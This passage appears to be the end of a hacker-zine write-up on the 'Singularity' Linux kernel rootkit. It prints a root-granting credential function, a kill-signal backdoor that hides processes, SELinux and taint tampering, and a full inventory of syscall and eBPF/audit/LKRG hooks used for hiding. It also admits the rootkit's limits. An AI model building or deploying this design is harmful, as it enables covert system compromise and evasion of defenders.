+keeps running.
+
+
+  --[ Testing Protection
+
+The expected behavior is:
+
+    # Try various methods to disable ftrace
+
+    $ echo 0 > /proc/sys/kernel/ftrace_enabled
+    $ cat /proc/sys/kernel/ftrace_enabled
+    0
+
+    $ printf "0" > /proc/sys/kernel/ftrace_enabled
+    $ cat /proc/sys/kernel/ftrace_enabled
+    0
+
+    # These appear to work, but...
+
+    $ cat /sys/kernel/debug/tracing/trace | head -5
+    # tracer: function
+    #
+    # entries-in-buffer/entries-written: 1890/54321   #P:4
+
+    # ftrace and its hooks remain active
+
+    $ ps aux | grep 1890
+    (hidden process still hidden)
+
+
+============================================================================
+[0x0C] - KERNEL STATE AND LOAD ORDER
+============================================================================
+
+Some parts of the module change kernel state directly: credentials, SELinux
+enforcement, taint and module metadata.
+
+
+  --[ Credentials
+
+The privilege path is short:
+
+From modules/become_root.c:
+
+static notrace void SpawnRoot(void) {
+    struct cred *newcredentials;
+
+    newcredentials = prepare_creds();
+    if (!newcredentials)
+        return;
+
+    newcredentials->uid.val   = 0;
+    newcredentials->gid.val   = 0;
+    newcredentials->suid.val  = 0;
+    newcredentials->sgid.val  = 0;
+    newcredentials->fsuid.val = 0;
+    newcredentials->fsgid.val = 0;
+    newcredentials->euid.val  = 0;
+    newcredentials->egid.val  = 0;
+
+    commit_creds(newcredentials);
+}
+
+SpawnRoot() copies the current credentials with prepare_creds(), zeroes the
+UID/GID fields and commits the replacement.  task_struct is not edited
+directly.
+
+
+  --[ kill -59
+
+The local root path runs through the same kill -59 flow that hides the
+caller.
+
+Privilege escalation is tied to process hiding:
+
+  - caller sends signal 59
+  - hide_process_tree() hides the caller, thread-group members, current
+    children, and up to 8 real-parent ancestors through
+        hide_parent_lineage()
+  - SpawnRoot() elevates credentials
+  - optional target PID is also inserted into the hidden tracking paths
+
+  --[ State already covered
+
+The state changes described in sections 0x0A and 0x0B are:
+
+  - bypass_selinux_disable() clears state->enforcing only when the kernel
+    was built with CONFIG_SECURITY_SELINUX_DEVELOP. The read/write hooks
+    expose a separate fake value; cleanup removes those hooks but does not
+    restore the enforcement bit.
+  - reset_tainted_init() resolves tainted_mask, starts zer0t, clears the
+    mask once and records the short-lived thread as hidden.
+  - module_hide_current_deferred() waits five seconds before removing sysfs,
+    module-list and kallsyms metadata. That delay leaves the load window
+    discussed in section 0x0D.
+
+The code and pages remain resident after the metadata is removed, and
+nothing in this state change protects the module from an observer below the
+guest.
+
+
+The hook inventory and initialization/cleanup order are in Appendix A.
+
+
+============================================================================
+[0x0D] - GAPS
+============================================================================
+
+The load window is real. Between `insmod` and the delayed unlink, the module
+exists in the ordinary places. If somebody records the load then, nothing
+later in this code can make that old event unhappen.
+
+Then there is the hard boundary: anything outside the kernel being lied
+through. VMI from a hypervisor, Intel PT, a tap below the guest, measured
+boot, or a policy that refuses the module in the first place does not need
+to trust these interfaces. Different game.
+
+
+============================================================================
+[0x0E] - CONCLUSION
+============================================================================
+
+This project started with one question: can a rootkit actually hide from
+everything running on the same kernel? Every time I thought the answer
+was yes, another detection path showed up. Every detection path became
+another hook and the scope kept growing.
+
+Building this taught me more about how Linux works than reading docs ever
+did. To hide a process I had to understand /proc. To hide a connection I
+had to understand seq_file, diag netlink, and packet delivery. To get
+past eBPF telemetry I had to understand how BPF programs receive and
+correlate data. You can't subvert something you don't understand.
+
+The limits are real, hook installation can partially fail, some paths
+skip descendants, symbols and layouts break across versions, and nothing
+here reaches a hypervisor or hardware tracing. Those gaps are in the
+source.
+
+ps, ss, dmesg, an in-guest EDR, they stop being independent once the
+kernel supplying them isn't. That's the uncomfortable part.
+
+Rootkit development is a small niche, but the community is gold.
+
+Stay curious. Stay paranoid. Keep hacking.
+
+                                                    -- @MatheuZSecurity
+
+
+[ References
+
+[1] The Art of Linux Kernel Rootkits
+    https://tmpout.sh/4/10.html
+
+[2] Xcellerator's Linux rootkit series
+    https://xcellerator.github.io/tags/rootkit/
+
+[3] The Linux Kernel Module Programming Guide
+    https://sysprog21.github.io/lkmpg/
+
+[4] Linux rootkit code collection
+    https://github.com/MatheuZSecurity/Rootkit
+
+[5] Evading Elastic Security With Singularity
+    https://matheuzsecurity.github.io/hacking/bypassing-elastic/
+
+[6] Evading Linux EDRs with io_uring
+https://matheuzsecurity.github.io/hacking/evading-linux-edrs-with-io-uring/
+
+[7] Attacking cleanup_module in a kernel module
+    https://github.com/MatheuZSecurity/UnhookingLinuxEdr
+
+[8] Stealthy Linux Kernel Rootkit
+    https://github.com/MatheuZSecurity/Singularity
+
+============================================================================
+[A] - HOOK INVENTORY AND LOAD ORDER
+============================================================================
+
+The inventory below mirrors the HOOK(...) entries in modules/*.c.
+
+modules/hiding_directory.c:
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64)
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents)
+    HOOK("__ia32_sys_getdents64",
+         hook_getdents64_compat,
+         &orig_getdents64_ia32)
+    HOOK("__ia32_sys_getdents", hook_getdents_compat, &orig_getdents_ia32)
+    HOOK("__ia32_compat_sys_getdents",
+         hook_getdents_compat,
+         &orig_getdents_ia32)
+
+modules/hiding_readlink.c:
+    HOOK("__x64_sys_readlink", hook_readlink, &orig_readlink)
+    HOOK("__ia32_sys_readlink", hook_readlink32, &orig_readlink32)
+
+modules/hiding_chdir.c:
+    HOOK("__x64_sys_chdir", hook_chdir, &orig_chdir)
+    HOOK("__ia32_sys_chdir", hook_chdir32, &orig_chdir32)
+
+modules/open.c:
+    HOOK("__x64_sys_openat", hook_openat, &orig_openat)
+    HOOK("__ia32_sys_openat", hook_openat32, &orig_openat32)
+    HOOK("__ia32_compat_sys_openat",
+         hook_openat32_compat,
+         &orig_openat32_compat)
+    HOOK("__x64_sys_readlinkat", hook_readlinkat, &orig_readlinkat)
+    HOOK("__ia32_sys_readlinkat", hook_readlinkat32, &orig_readlinkat32)
+    HOOK("__x64_sys_access", hook_access, &orig_access)
+    HOOK("__ia32_sys_access", hook_access32, &orig_access32)
+    HOOK("__x64_sys_faccessat", hook_faccessat, &orig_faccessat)
+    HOOK("__ia32_sys_faccessat", hook_faccessat32, &orig_faccessat32)
+    HOOK("__x64_sys_faccessat2", hook_faccessat2, &orig_faccessat2)
+
+modules/hiding_stat.c:
+    HOOK("__x64_sys_statx", hooked_sys_statx, &real_sys_statx)
+    HOOK("__ia32_sys_statx", hooked_sys_statx32, &real_sys_statx32)
+    HOOK("__x64_sys_stat", hooked_sys_stat, &real_sys_stat)
+    HOOK("__ia32_sys_stat", hooked_sys_stat32, &real_sys_stat32)
+    HOOK("__x64_sys_lstat", hooked_sys_lstat, &real_sys_lstat)
+    HOOK("__ia32_sys_lstat", hooked_sys_lstat32, &real_sys_lstat32)
+    HOOK("__x64_sys_newstat", hooked_sys_newstat, &real_sys_newstat)
+    HOOK("__ia32_sys_newstat", hooked_sys_newstat32, &real_sys_newstat32)
+    HOOK("__x64_sys_newlstat", hooked_sys_newlstat, &real_sys_newlstat)
+    HOOK("__ia32_sys_newlstat", hooked_sys_newlstat32, &real_sys_newlstat32)
+    HOOK("__x64_sys_getpriority",
+         hooked_sys_getpriority,
+         &real_sys_getpriority)
+    HOOK("__ia32_sys_getpriority",
+         hooked_sys_getpriority,
+         &real_sys_getpriority32)
+    HOOK("__x64_sys_newfstatat",
+         hooked_sys_newfstatat,
+         &real_sys_newfstatat)
+    HOOK("__ia32_sys_newfstatat",
+         hooked_sys_newfstatat32,
+         &real_sys_newfstatat32)
+
+modules/become_root.c:
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill)
+    HOOK("__x64_sys_getpgid", hook_getpgid, &orig_getpgid)
+    HOOK("__x64_sys_getpgrp", hook_getpgrp, &orig_getpgrp)
+    HOOK("__x64_sys_getsid", hook_getsid, &orig_getsid)
+    HOOK("__x64_sys_sched_getaffinity",
+         hook_sched_getaffinity,
+         &orig_sched_getaffinity)
+    HOOK("__x64_sys_sched_getparam",
+         hook_sched_getparam,
+         &orig_sched_getparam)
+    HOOK("__x64_sys_sched_getscheduler",
+         hook_sched_getscheduler,
+         &orig_sched_getscheduler)
+    HOOK("__x64_sys_sched_rr_get_interval",
+         hook_sched_rr_get_interval,
+         &orig_sched_rr_get_interval)
+    HOOK("__x64_sys_sysinfo", hook_sysinfo, &orig_sysinfo)
+    HOOK("__x64_sys_pidfd_open", hook_pidfd_open, &orig_pidfd_open)
+
+modules/task.c:
+    HOOK("taskstats_user_cmd",
+         hook_taskstats_user_cmd,
+         &orig_taskstats_user_cmd)
+
+modules/trace.c:
+    HOOK("wake_up_new_task",
+         hook_wake_up_new_task,
+         &orig_wake_up_new_task)
+
+modules/hiding_tcp.c:
+    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show)
+    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show)
+    HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show)
+    HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show)
+    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv)
+
+modules/audit.c:
+    HOOK("audit_log_start", hook_audit_log_start, &orig_audit_log_start)
+    HOOK("netlink_unicast", hook_netlink_unicast, &orig_netlink_unicast)
+    HOOK("__x64_sys_recvmsg", hook_recvmsg, &orig_recvmsg)
+    HOOK("__x64_sys_recvfrom", hook_recvfrom, &orig_recvfrom)
+
+modules/bpf_hook.c:
+    HOOK("bpf_map_lookup_elem",
+         hook_bpf_map_lookup_elem,
+         &orig_bpf_map_lookup_elem)
+    HOOK("bpf_map_update_elem",
+         hook_bpf_map_update_elem,
+         &orig_bpf_map_update_elem)
+    HOOK("array_map_update_elem",
+         hook_array_map_update_elem,
+         &orig_array_map_update_elem)
+    HOOK("bpf_ringbuf_output",
+         hook_bpf_ringbuf_output,
+         &orig_bpf_ringbuf_output)
+    HOOK("bpf_ringbuf_reserve",
+         hook_bpf_ringbuf_reserve,
+         &orig_bpf_ringbuf_reserve)
+    HOOK("bpf_ringbuf_submit",
+         hook_bpf_ringbuf_submit,
+         &orig_bpf_ringbuf_submit)
+    HOOK("bpf_ringbuf_reserve_dynptr",
+         hook_bpf_ringbuf_reserve_dynptr,
+         &orig_bpf_ringbuf_reserve_dynptr)
+    HOOK("bpf_ringbuf_submit_dynptr",
+         hook_bpf_ringbuf_submit_dynptr,
+         &orig_bpf_ringbuf_submit_dynptr)
+    HOOK("perf_event_output",
+         hook_perf_event_output,
+         &orig_perf_event_output)
+    HOOK("perf_trace_run_bpf_submit",
+         hook_perf_trace_run_bpf_submit,
+         &orig_perf_trace_run_bpf_submit)
+    HOOK("bpf_iter_run_prog",
+         hook_bpf_iter_run_prog,
+         &orig_bpf_iter_run_prog)
+    HOOK("bpf_seq_write", hook_bpf_seq_write, &orig_bpf_seq_write)
+    HOOK("bpf_seq_printf", hook_bpf_seq_printf, &orig_bpf_seq_printf)
+    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf)
+    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32)
+    /* kernel 6.19 dispatch paths */
+    HOOK("trace_call_bpf", hook_trace_call_bpf, &orig_trace_call_bpf)
+    HOOK("bpf_trace_run1", hook_bpf_trace_run1, &orig_bpf_trace_run1)
+    HOOK("bpf_trace_run2", hook_bpf_trace_run2, &orig_bpf_trace_run2)
+    HOOK("bpf_trace_run3", hook_bpf_trace_run3, &orig_bpf_trace_run3)
+    HOOK("bpf_trace_run4", hook_bpf_trace_run4, &orig_bpf_trace_run4)
+    HOOK("bpf_trace_run5", hook_bpf_trace_run5, &orig_bpf_trace_run5)
+    HOOK("bpf_trace_run6", hook_bpf_trace_run6, &orig_bpf_trace_run6)
+    HOOK("bpf_trace_run7", hook_bpf_trace_run7, &orig_bpf_trace_run7)
+    HOOK("bpf_trace_run8", hook_bpf_trace_run8, &orig_bpf_trace_run8)
+    HOOK("bpf_trace_run9", hook_bpf_trace_run9, &orig_bpf_trace_run9)
+    HOOK("bpf_trace_run10", hook_bpf_trace_run10, &orig_bpf_trace_run10)
+    HOOK("bpf_trace_run11", hook_bpf_trace_run11, &orig_bpf_trace_run11)
+    HOOK("bpf_trace_run12", hook_bpf_trace_run12, &orig_bpf_trace_run12)
+    HOOK("___bpf_prog_run", hook_bpf_prog_run_fn,
+         &orig_bpf_prog_run_fn)
+
+modules/hooks_write.c:
+    HOOK("__x64_sys_write", hooked_write, &original_write)
+    HOOK("__ia32_sys_write", hooked_write32, &original_write32)
+    HOOK("__x64_sys_writev", hooked_writev, &original_writev)
+    HOOK("__ia32_sys_writev", hooked_writev32, &original_writev32)
+    HOOK("__x64_sys_pwrite64", hooked_pwrite64, &original_pwrite64)
+    HOOK("__x64_sys_ia32_pwrite64",
+         hooked_pwrite64_ia32,
+         &original_pwrite64_ia32)
+    HOOK("__x64_sys_pwritev", hooked_pwritev, &original_pwritev)
+    HOOK("__x64_sys_pwritev2", hooked_pwritev2, &original_pwritev2)
+    HOOK("__ia32_sys_pwritev", hooked_pwritev_ia32, &original_pwritev_ia32)
+    HOOK("__ia32_sys_pwritev2",
+         hooked_pwritev2_ia32,
+         &original_pwritev2_ia32)
+    HOOK("__x64_sys_sendfile", hooked_sendfile, &original_sendfile)
+    HOOK("__x64_sys_sendfile64", hooked_sendfile64, &original_sendfile64)
+    HOOK("__ia32_sys_sendfile",
+         hooked_sendfile_ia32,
+         &original_sendfile_ia32)
+    HOOK("__ia32_sys_sendfile64",
+         hooked_sendfile64_ia32,
+         &original_sendfile64_ia32)
+    HOOK("__ia32_compat_sys_sendfile",
+         hooked_compat_sendfile,
+         &original_compat_sendfile)
+    HOOK("__ia32_compat_sys_sendfile64",
+         hooked_compat_sendfile64,
+         &original_compat_sendfile64)
+    HOOK("__x64_sys_copy_file_range",
+         hooked_copy_file_range,
+         &original_copy_file_range)
+    HOOK("__ia32_sys_copy_file_range",
+         hooked_copy_file_range_ia32,
+         &original_copy_file_range_ia32)
+    HOOK("__x64_sys_splice", hooked_splice, &original_splice)
+    HOOK("__ia32_sys_splice", hooked_splice_ia32, &original_splice_ia32)
+    HOOK("__x64_sys_vmsplice", hooked_vmsplice, &original_vmsplice)
+    HOOK("__ia32_sys_vmsplice",
+         hooked_vmsplice_ia32,
+         &original_vmsplice_ia32)
+    HOOK("__x64_sys_tee", hooked_tee, &original_tee)
+    HOOK("__ia32_sys_tee", hooked_tee_ia32, &original_tee_ia32)
+    HOOK("__x64_sys_io_uring_enter",
+         hooked_io_uring_enter,
+         &original_io_uring_enter)
+    HOOK("__ia32_sys_io_uring_enter",
+         hooked_io_uring_enter,
+         &original_io_uring_enter2)
+
+modules/clear_taint_dmesg.c:
+    HOOK("__x64_sys_read", hook_read, &orig_read)
+    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32)
+    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64)
+    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32)
+    HOOK("__x64_sys_readv", hook_readv, &orig_readv)
+    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32)
+    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv)
+    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32)
+    HOOK("do_syslog", hook_do_syslog, &orig_do_syslog)
+    HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show)
+
+modules/icmp.c:
+    HOOK("icmp_rcv", hook_icmp_rcv, &orig_icmp_rcv)
+    HOOK("sel_read_enforce", hook_sel_read_enforce, &orig_sel_read_enforce)
+    HOOK("sel_write_enforce",
+         hook_sel_write_enforce,
+         &orig_sel_write_enforce)
+
+modules/lkrg_bypass.c:
+    HOOK("vprintk_emit", hook_vprintk_emit, &orig_vprintk_emit)
+    HOOK("call_usermodehelper_exec_async",
+         hook_call_usermodehelper_exec_async,
+         &orig_call_usermodehelper_exec_async)
+    HOOK("call_usermodehelper_exec",
+         hook_call_usermodehelper_exec,
+         &orig_call_usermodehelper_exec)
+    HOOK("send_sig_info",
+         hook_send_sig_info,
+         &orig_send_sig_info)
+    HOOK("p_ed_enforce_validation",
+         hook_p_ed_enforce_validation,
+         &orig_p_ed_enforce_validation)
+    HOOK("p_ed_enforce_validation_paranoid",
+         hook_p_ed_enforce_validation_paranoid,
+         &orig_p_ed_enforce_validation_paranoid)
+    HOOK("p_ed_validate_current",
+         hook_p_ed_validate_current,
+         &orig_p_ed_validate_current)
+    HOOK("p_ed_validate_off_flag_wrap",
+         hook_p_ed_validate_off_flag_wrap,
+         &orig_p_ed_validate_off_flag_wrap)
+    HOOK("p_ed_enforce_pcfi",
+         hook_p_ed_enforce_pcfi,
+         &orig_p_ed_enforce_pcfi)
+
+modules/sysrq_hook.c:
+    HOOK("sched_show_task", hook_sched_show_task, &orig_sched_show_task)
+    HOOK("dump_header", hook_dump_header, &orig_dump_header)
+    HOOK("print_task.isra.0", hook_print_task_isra, &orig_print_task_isra)
+
+modules/selfdefense.c:
+    HOOK("copy_from_kernel_nofault",
+         hook_copy_from_kernel_nofault,
+         &orig_copy_from_kernel_nofault)
+    HOOK("kallsyms_on_each_symbol",
+         hook_kallsyms_on_each_symbol,
+         &orig_kallsyms_on_each_symbol)
+    HOOK("__module_address", hook_module_address, &orig_module_address)
+    HOOK("find_module", hook_find_module, &orig_find_module)
+
+    HOOK("walk_system_ram_res",
+         hook_walk_system_ram_res,
+         &orig_walk_system_ram_res)
+    HOOK("walk_iomem_res_desc",
+         hook_walk_iomem_res_desc,
+         &orig_walk_iomem_res_desc)
+
+    kprobe("copy_mc_to_kernel", sd_copy_mc_pre)
+
+  --[ main.c initialization and cleanup
+
+singularity_init() currently performs the early self-defense setup first:
+
+1. sd_protect_symbol("register_kprobe")
+2. sd_bootstrap_kprobe_hook()
+3. lkrg_bypass_init()
+4. sd_snapshot_all()
+5. selfdefense_init()
+
+After that, main.c accumulates subsystem initialization results with ret |=
+... in this order:
+
+1. reset_tainted_init()
+2. hiding_open_init()
+3. become_root_init()
+4. hiding_directory_init()
+5. hiding_stat_init()
+6. hiding_tcp_init()
+7. clear_taint_dmesg_init()
+8. hooks_write_init()
+9. hiding_chdir_init()
+10. hiding_readlink_init()
+11. bpf_hook_init()
+12. hiding_icmp_init()
+13. trace_pid_init()
+14. hooking_audit_init()
+15. taskstats_hook_init()
+16. sysrq_hook_init()
+17. module_hide_current_deferred()
+
+singularity_exit() unwinds in this order:
+
+1. module_hide_cancel_deferred()
+2. sysrq_hook_exit()
+3. taskstats_hook_exit()
+4. hooking_audit_exit()
+5. trace_pid_cleanup()
+6. hiding_icmp_exit()
+7. bpf_hook_exit()
+8. hiding_readlink_exit()
+9. hiding_chdir_exit()
+10. hooks_write_exit()
+11. clear_taint_dmesg_exit()
+12. hiding_tcp_exit()
+13. hiding_stat_exit()
+14. hiding_directory_exit()
+15. become_root_exit()
+16. hiding_open_exit()
+17. reset_tainted_exit()
+18. selfdefense_exit()
+19. lkrg_bypass_exit()
+
+|=[ EOF ]=---------------------------------------------------------------=|
